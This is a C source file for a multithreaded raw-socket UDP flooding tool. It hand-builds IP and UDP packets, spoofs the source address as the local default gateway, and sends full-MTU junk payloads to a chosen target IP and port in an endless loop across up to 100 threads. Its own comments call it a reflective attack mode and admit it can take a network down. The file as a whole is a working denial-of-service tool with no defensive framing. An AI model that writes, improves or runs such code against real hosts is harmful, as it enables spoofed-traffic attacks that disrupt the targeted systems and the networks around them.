#include "common.h"
#include "utils.h"
#include "udp_utils.h"
#include "ip_utils.h"

volatile long long total_packets_sent = 0;
pthread_mutex_t packet_count_mutex;
volatile sig_atomic_t keep_running = 1; 
u_int32_t default_gateway_ip_net = 0; 

void sigint_handler(int signo) {
    printf("\nSIGINT (Ctrl+C) received. Shutting down...\n");
    keep_running = 0;
}

typedef struct {
    int thread_id;
    u_int32_t dst_ip_net; 
    int isRandomPort;
    u_int16_t dst_port;
    u_int16_t base_src_port;
    int data_len;
} ThreadArgs;

void* sender_thread(void* arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    
    // u_int32_t src_ip_net = generate_random_ip_u32(); 
    u_int32_t src_ip_net = default_gateway_ip_net;
    u_int16_t src_port = args->base_src_port + args->thread_id;
    u_int16_t dst_port = (args->isRandomPort) ? (u_int16_t)(1024 + rand() % (65536 - 1024)) : args->dst_port;
    u_int32_t dst_ip_net = args->dst_ip_net;
    
    printf("Thread %d: Starting to send packets from %s:%d ",
        args->thread_id, inet_ntoa(*(struct in_addr *)&src_ip_net), src_port);
    printf("to %s:%d\n",
        inet_ntoa(*(struct in_addr *)&dst_ip_net), dst_port);

    // format string bug when i printf like below =)) Maybe ~~
    // printf("Thread %d: Starting to send packets from %s:%d to %s:%d\n",
    //     args->thread_id, inet_ntoa(*(struct in_addr *)&src_ip_net), src_port,
    //     inet_ntoa(*(struct in_addr *)&dst_ip_net), dst_port);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket error in thread");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL error in thread");
        close(sockfd);
        pthread_exit(NULL);
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = dst_ip_net;

    long long thread_packet_count = 0; 
    int ip_header_len = sizeof(struct ip_header); 
    int total_packet_size = ip_header_len + sizeof(struct udphdr) + args->data_len;
    char* raw_packet_buffer = malloc(total_packet_size);
    if (!raw_packet_buffer) {
        perror("malloc for raw_packet_buffer failed");
        close(sockfd);
        pthread_exit(NULL);
    }

    struct ip_header* p_ip_header = (struct ip_header*)raw_packet_buffer;
    p_ip_header->version = 4;
    p_ip_header->ihl = ip_header_len / 4;
    p_ip_header->tos = 0;
    p_ip_header->total_length = htons(total_packet_size);
    p_ip_header->identification = htons(rand() % 65536);
    p_ip_header->frag_off = 0;
    p_ip_header->ttl = 64;
    p_ip_header->protocol = IPPROTO_UDP;
    p_ip_header->saddr = src_ip_net;
    p_ip_header->daddr = dst_ip_net;
    p_ip_header->header_checksum = 0; 

    struct udphdr* p_udp_header = (struct udphdr*)(raw_packet_buffer + ip_header_len);
    p_udp_header->source = htons(src_port); 
    p_udp_header->dest = htons(dst_port);     
    p_udp_header->len = htons(sizeof(struct udphdr) + args->data_len); 
    p_udp_header->check = 0; 

    uint8_t *p_payload = (uint8_t*)raw_packet_buffer + ip_header_len + sizeof(struct udphdr);
    memset(p_payload, 'A', args->data_len); 

    while (keep_running) {
        p_ip_header->identification = htons(rand() % 65536);

        p_udp_header->check = 0; 
        p_udp_header->check = udp_checksum(src_ip_net, dst_ip_net, p_udp_header, p_payload, args->data_len);
        if (p_udp_header->check == 0) {
            fprintf(stderr, "UDP checksum calculation failed (thread %d), exiting.\n", args->thread_id);
            break; 
        }

        p_ip_header->header_checksum = ip_checksum(p_ip_header);

        int packet_len = ntohs(p_ip_header->total_length);
        ssize_t sent = sendto(sockfd, raw_packet_buffer, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        if (sent < 0) {
            perror("cannot sendto() in thread");
        } else {
            thread_packet_count++;
            pthread_mutex_lock(&packet_count_mutex);
            total_packets_sent++;
            if (total_packets_sent % 1000000 == 0) {
                printf("Total packets sent: %lld\n", total_packets_sent);
            }
            pthread_mutex_unlock(&packet_count_mutex);
        }
    }

    free(raw_packet_buffer);

    close(sockfd);
    printf("Thread %d: Stopping. Sent %lld packets.\n", args->thread_id, thread_packet_count);
    pthread_exit(NULL);
}


void print_usage(const char* prog_name) {
    fprintf(stderr, "Usage: %s [-p <dest port>] [-m <mtu>] [-t <thread>] -d <destination IP>\n", prog_name);
    fprintf(stderr, "\t-p <dest port>     : Specify destination port (default: random or 8888 if -p not used)\n");
    fprintf(stderr, "\t-m <mtu>           : Specify MTU size (default: 1500)\n");
    fprintf(stderr, "\t-d <destination IP>: Target IP address (REQUIRED)\n");
    fprintf(stderr, "\t-t <thread>        : Number of threads to use (default: 1, max 100)\n");
    fprintf(stderr, "\t-h                 : Show this help message\n");
}

int main(int argc, char* argv[]) {
    srand(time(NULL)); 
    printf("                                                        \n\
                        _ooOoo_                                     \n\
                       o8888888o                                    \n\
                       88\" . \"88                                  \n\
                       (| -_- |)                                    \n\
                       O\\  =  /O                                   \n\
                    ____/`---'\\____                                \n\
                  .'  \\|     |//  `.                               \n\
                 /  \\|||  :  |||//  \\                             \n\
                /  _||||| -:- |||||_  \\                            \n\
                |   | \\\\  -  /'| |   |                            \n\
                | \\_|  `\\`---'//  |_/ |                           \n\
                \\  .-\\__ `-. -'__/-.  /                           \n\
              ___`. .'  /--.--\\  `. .'___                          \n\
           .\"\" '<  `.___\\_<|>_/___.' _> \\\"\".                  \n\
          | | :  `- \\`. ;`. _/; .'/ /  .' ; |                      \n\
          \\  \\ `-.   \\_\\_`. _.'_/_/  -' _.' /                   \n\
===========`-.`___`-.__\\ \\___  /__.-'_.'_.-'================      \n\
                        `=--=-'                                     \n\
    ");
    
    default_gateway_ip_net = get_default_gateway_ip_u32(); // fake IP router :)) It's better than random IPs but quite dangerous if you hit real devices
                                                           // Your network can be downtimed :))
    if (default_gateway_ip_net == 0) {
        fprintf(stderr, "Warning: Could not determine default gateway IP. Reflective attack mode may not work correctly.\n");
        default_gateway_ip_net = inet_addr("192.168.1.1"); // Fallback
    }

    if (getuid() != 0) {
        fprintf(stderr, "This program must be run as root.\n");
        return 1;
    }

    if (signal(SIGINT, sigint_handler) == SIG_ERR) {
        perror("Cannot catch SIGINT");
        return 1;
    }

    if (pthread_mutex_init(&packet_count_mutex, NULL) != 0) {
        perror("Mutex init failed");
        return 1;
    }

    int isRandomPort = 1; 
    int mtu = MTU_DEFAULT;
    const char* dst_ip_str = NULL; 
    u_int16_t dst_port = 8888; 
    int num_threads = 1;
    
    int opt; 
    while ((opt = getopt(argc, argv, "p:m:hd:t:")) != -1) {
        switch (opt) {
            case 'p':
                if (!is_valid_port_str(optarg)) { 
                    fprintf(stderr, "Invalid port number: %s\n", optarg);
                    return 1;
                }
                dst_port = (u_int16_t)atoi(optarg);
                isRandomPort = 0;
                break;
            case 'm':
                mtu = atoi(optarg);
                if (mtu < (MAX_IP_HEADER_SIZE + UDP_HEADER_SIZE + 1)) { 
                    fprintf(stderr, "MTU must be at least %d (IP_HDR_MAX + UDP_HDR + 1 byte payload)\n", MAX_IP_HEADER_SIZE + UDP_HEADER_SIZE + 1);
                    return 1;
                }
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            case 'd':
                if (!is_valid_ip(optarg)) {
                    fprintf(stderr, "Invalid IP address: %s\n", optarg);
                    return 1;
                }
                dst_ip_str = optarg;
                break;
            case 't':
                num_threads = atoi(optarg);
                if (num_threads <= 0 || num_threads > 100) {
                    fprintf(stderr, "Number of threads must be between 1 and 100\n");
                    return 1;
                }
                break;
            default:
                fprintf(stderr, "Unknown option\n");
                print_usage(argv[0]);
                return 1;
        }
    }

    if (dst_ip_str == NULL) {
        fprintf(stderr, "Destination IP (-d) is required.\n");
        print_usage(argv[0]);
        return 1;
    }

    u_int16_t base_src_port = (u_int16_t)(rand() % 50000 + 1024); 
    u_int32_t dst_ip_net = inet_addr(dst_ip_str);
    int data_len = mtu - MAX_HEADER_SIZE; 
    if (data_len < 0) {
        data_len = 0;
        fprintf(stderr, "Warning: MTU too small for headers. Payload size set to 0.\n");
    }

    pthread_t threads[num_threads];
    ThreadArgs thread_args[num_threads];

    printf("Starting raw UDP sender with %d threads (Press Ctrl+C to stop).\n", num_threads);

    for (int i = 0; i < num_threads; i++) {
        thread_args[i].thread_id = i;
        thread_args[i].dst_ip_net = dst_ip_net; 
        thread_args[i].isRandomPort = isRandomPort;
        thread_args[i].base_src_port = base_src_port;
        thread_args[i].dst_port = dst_port;
        thread_args[i].data_len = data_len;

        if (pthread_create(&threads[i], NULL, sender_thread, (void*)&thread_args[i]) != 0) {
            perror("Failed to create thread");
            keep_running = 0; 
            for (int j = 0; j < i; j++) {
                pthread_join(threads[j], NULL); 
            }
            pthread_mutex_destroy(&packet_count_mutex); 
            return 1;
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("All threads finished. Final total packets sent: %lld. Program exiting.\n", total_packets_sent);
    
    pthread_mutex_destroy(&packet_count_mutex);

    return 0;
}
